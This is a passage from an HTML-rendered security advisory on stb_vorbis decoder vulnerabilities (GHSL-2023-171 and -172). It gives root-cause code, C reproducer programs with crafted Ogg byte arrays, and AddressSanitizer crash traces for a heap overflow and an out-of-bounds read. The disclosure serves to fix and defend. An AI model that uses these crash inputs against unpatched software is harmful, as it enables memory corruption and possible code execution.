                            <span class="mh">0x8f</span><span class="p">,</span><span class="mh">0x4e</span><span class="p">,</span><span class="mh">0xfd</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0xa7</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0xb7</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x3e</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0xfc</span><span class="p">,</span>
                            <span class="mh">0xef</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x2a</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span>
                            <span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x9e</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0xd9</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0xea</span><span class="p">,</span>
                            <span class="mh">0x52</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x81</span><span class="p">,</span><span class="mh">0xa5</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span>
                            <span class="mh">0x3f</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x9d</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0x93</span><span class="p">,</span><span class="mh">0x9c</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x98</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0x29</span><span class="p">,</span>
                            <span class="mh">0x79</span><span class="p">,</span><span class="mh">0x9c</span><span class="p">,</span><span class="mh">0xb3</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0xe9</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="mh">0xc4</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0x86</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="mh">0x03</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">chan</span><span class="p">,</span> <span class="n">samplerate</span><span class="p">;</span>
    <span class="kt">short</span> <span class="o">*</span><span class="n">output</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">samples</span> <span class="o">=</span> <span class="n">stb_vorbis_decode_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chan</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">samplerate</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">output</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">samples</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddressSanitizer:DEADLYSIGNAL
=================================================================
==264664==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004dbe50 bp 0x7ffddf2f2e30 sp 0x7ffddf2f2b40 T0)
==264664==The signal is caused by a READ memory access.
    #0 0x4dbe50 in vorbis_deinit(stb_vorbis*) tests/../stb_vorbis.c:4214:21
    #1 0x4f9638 in stb_vorbis_open_memory tests/../stb_vorbis.c:5122:4
    #2 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20
</code></pre></div></div>

<h3 id="issue-14-out-of-bounds-heap-buffer-write-ghsl-2023-171">Issue 14: Out of bounds heap buffer write (<code class="language-plaintext highlighter-rouge">GHSL-2023-171</code>)</h3>

<p>A crafted file may trigger memory write past an allocated heap buffer in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3677"><code class="language-plaintext highlighter-rouge">start_decoder</code></a> at [1]. The root cause is a potential integer overflow <code class="language-plaintext highlighter-rouge">sizeof(char*) * (f-&gt;comment_list_length)</code> at [2] which may make <code class="language-plaintext highlighter-rouge">setup_malloc</code> allocate less memory than required. Since there is another integer overflow at [1] attacker may overflow it too to force <code class="language-plaintext highlighter-rouge">setup_malloc</code> to return <code class="language-plaintext highlighter-rouge">0</code> and make the exploit more reliable.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
   <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">**</span><span class="p">)</span> <span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">));</span> <span class="c1">// [2] Int overflow</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>                  <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list_length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">len</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span> <span class="c1">// [1] OOB</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>               <span class="k">return</span> <span class="n">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span>

      <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">get8_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">comment_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="sc">'\0'</span><span class="p">;</span>
   <span class="p">}</span>
</code></pre></div></div>

<p>Similar potential vulnerability exists in other <code class="language-plaintext highlighter-rouge">setup_malloc</code> use cases as:</p>

<ul>
  <li><a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3716"><code class="language-plaintext highlighter-rouge">f-&gt;codebooks = (Codebook *) setup_malloc(f, sizeof(*f-&gt;codebooks) * f-&gt;codebook_count);</code></a></li>
  <li><a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3802"><code class="language-plaintext highlighter-rouge">c-&gt;codewords = (uint32 *) setup_malloc(f, sizeof(c-&gt;codewords[0]) * c-&gt;entries);</code></a></li>
  <li>etc.</li>
</ul>

<h4 id="impact-13">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-13">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0xb6</span><span class="p">,</span><span class="mh">0xe4</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span>
                            <span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xb6</span><span class="p">,</span><span class="mh">0xe4</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x7b</span><span class="p">,</span>
                            <span class="mh">0x0e</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
                            <span class="mh">0x81</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x2b</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span>
                            <span class="mh">0x70</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0xc6</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span>
                            <span class="mh">0x85</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0xf7</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">chan</span><span class="p">,</span> <span class="n">samplerate</span><span class="p">;</span>
    <span class="kt">short</span> <span class="o">*</span><span class="n">output</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">samples</span> <span class="o">=</span> <span class="n">stb_vorbis_decode_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chan</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">samplerate</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">output</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">samples</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==359215==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000018 at pc 0x0000004e45b7 bp 0x7ffcdb4f8df0 sp 0x7ffcdb4f8de8
WRITE of size 8 at 0x602000000018 thread T0
    #0 0x4e45b6 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3670:26
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
    #2 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20
</code></pre></div></div>

<h3 id="issue-15-wild-address-read-in-vorbis_decode_packet_rest-ghsl-2023-172">Issue 15: Wild address read in <code class="language-plaintext highlighter-rouge">vorbis_decode_packet_rest</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-172</code>)</h3>

<p>A crafted file may trigger out of bounds read in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3231"><code class="language-plaintext highlighter-rouge">DECODE</code></a> macro <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L1754-L1756">when <code class="language-plaintext highlighter-rouge">var</code> is negative</a> [1]</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define DECODE(var,f,c)                                       \
   DECODE_RAW(var,f,c)                                        \
   if (c-&gt;sparse) var = c-&gt;sorted_values[var]; // [1] OOB
</span></code></pre></div></div>

<p>As it can be seen in the definition of <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L1717-L1729"><code class="language-plaintext highlighter-rouge">DECODE_RAW</code></a> negative <code class="language-plaintext highlighter-rouge">var</code> is a valid value [2] and [3] (<code class="language-plaintext highlighter-rouge">codebook_decode_scalar_raw</code> may also return a negative value).</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define DECODE_RAW(var, f,c)                                  \
   if (f-&gt;valid_bits &lt; STB_VORBIS_FAST_HUFFMAN_LENGTH)        \
      prep_huffman(f);                                        \
   var = f-&gt;acc &amp; FAST_HUFFMAN_TABLE_MASK;                    \
   var = c-&gt;fast_huffman[var];                                \
   if (var &gt;= 0) {                                            \
      int n = c-&gt;codeword_lengths[var];                       \
      f-&gt;acc &gt;&gt;= n;                                           \
      f-&gt;valid_bits -= n;                                     \
      if (f-&gt;valid_bits &lt; 0) { f-&gt;valid_bits = 0; var = -1; } \ // [2]
</span>   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>                                                   \
      <span class="n">var</span> <span class="o">=</span> <span class="n">codebook_decode_scalar_raw</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">c</span><span class="p">);</span>                  <span class="err">\</span> <span class="c1">// [3]</span>
   <span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-14">Impact</h4>

<p>This issue may be used to leak internal memory allocation information.</p>

<h4 id="resources-14">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2b</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xf1</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x93</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
                            <span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x39</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x9b</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0x94</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
                            <span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span>
                            <span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0xd4</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span>
                            <span class="mh">0x73</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
